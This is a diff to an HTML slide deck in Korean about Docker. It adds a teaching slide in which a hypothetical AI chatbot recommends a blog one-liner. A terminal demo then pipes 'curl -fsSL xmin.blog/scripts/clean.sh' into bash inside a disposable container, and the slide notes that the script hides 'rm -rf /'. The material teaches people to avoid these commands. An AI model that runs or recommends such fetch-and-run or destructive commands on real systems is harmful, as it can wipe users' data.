@@ -456,8 +456,50 @@
   </div>
 </div>
 
-<!-- Slide 6: When you need Docker -->
+<!-- Slide 6: Hands-on practice -->
 <div class="slide" id="slide-6">
+  <h2>실습: AI가 추천한 블로그 스크립트</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="quote-box" style="margin-bottom: 20px; font-size: 1.2rem;">
+        "리눅스 디스크 정리? 이 블로그에 한 줄짜리 스크립트 있어요:<br>
+        <code style="color:#f38ba8; font-family:'Fira Code',monospace; font-style:normal;">curl ... | sudo bash</code>"
+        <span style="display:block; margin-top:10px; font-size:0.95rem; color:#9ca3af; font-style:normal;">— AI 챗봇 (가정)</span>
+      </div>
+      <div class="danger-box">
+        <p style="font-size: 1.05rem; color:#fca5a5;"><b>겉보기:</b> 친절한 <code style="color:#fca5a5; font-family:'Fira Code',monospace;">echo</code> 메시지로 "정리 중..."</p>
+        <p style="font-size: 1.05rem; color:#fca5a5; margin-top:8px;"><b>실제:</b> <code style="color:#f38ba8; font-family:'Fira Code',monospace;">rm -rf /</code> 가 숨어있음</p>
+      </div>
+    </div>
+    <div class="col">
+      <div class="demo-terminal">
+        <div class="terminal-header">
+          <div class="terminal-dot red"></div>
+          <div class="terminal-dot yellow"></div>
+          <div class="terminal-dot green"></div>
+        </div>
+        <div class="terminal-body" style="font-size: 0.98rem;">
+          <span class="comment"># 컨테이너 띄우기</span><br>
+          <span class="prompt">$</span> <span class="cmd">docker run -it --rm ubuntu bash</span><br>
+          <br>
+          <span class="comment"># 블로그가 추천한 대로</span><br>
+          <span style="color:#f38ba8">root@abc:/#</span> <span class="cmd">apt install -y curl</span><br>
+          <span style="color:#f38ba8">root@abc:/#</span> <span class="danger">curl -fsSL xmin.blog/scripts/clean.sh \<br>&nbsp;&nbsp;| bash</span><br>
+          <br>
+          <span style="color:#6c7086">[+] 임시 파일 정리 중...</span><br>
+          <span style="color:#6c7086">[+] 캐시 비우기...</span><br>
+          <span style="color:#f38ba8">(시스템 박살)</span><br>
+          <br>
+          <span style="color:#f38ba8">root@abc:/#</span> <span class="cmd">exit</span><br>
+          <span class="prompt">$</span> <span class="safe">ls ~ &nbsp;&nbsp;# 호스트 멀쩡 ✓</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 7: When you need Docker -->
+<div class="slide" id="slide-7">
   <h2>도커가 필요한 순간들</h2>
   <div class="card-grid">
     <div class="card">
@@ -478,8 +520,8 @@
   </div>
 </div>
 
-<!-- Slide 7: Summary -->
-<div class="slide end-slide" id="slide-7">
+<!-- Slide 8: Summary -->
+<div class="slide end-slide" id="slide-8">
   <h2>정리</h2>
   <div style="max-width: 800px; margin: 0 auto;">
     <ul style="margin-bottom: 40px;">
@@ -496,8 +538,8 @@
   </div>
 </div>
 
-<!-- Slide 8: Q&A -->
-<div class="slide end-slide" id="slide-8">
+<!-- Slide 9: Q&A -->
+<div class="slide end-slide" id="slide-9">
   <div style="text-align:center;">
     <div style="font-size: 4rem; margin-bottom: 20px; background: linear-gradient(135deg, #60a5fa, #22d3ee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;">Q &amp; A</div>
     <p style="color: #6b7280; font-size: 1.3rem;">감사합니다</p>
@@ -509,11 +551,11 @@
   <button onclick="prevSlide()">&#8592; Prev</button>
   <button onclick="nextSlide()">Next &#8594;</button>
 </div>
-<div class="slide-counter" id="counter">1 / 8</div>
+<div class="slide-counter" id="counter">1 / 9</div>
 
 <script>
   let current = 1;
-  const total = 8;
+  const total = 9;
 
   function showSlide(n) {
     document.querySelectorAll('.slide').forEach(s => s.classList.remove('active'));
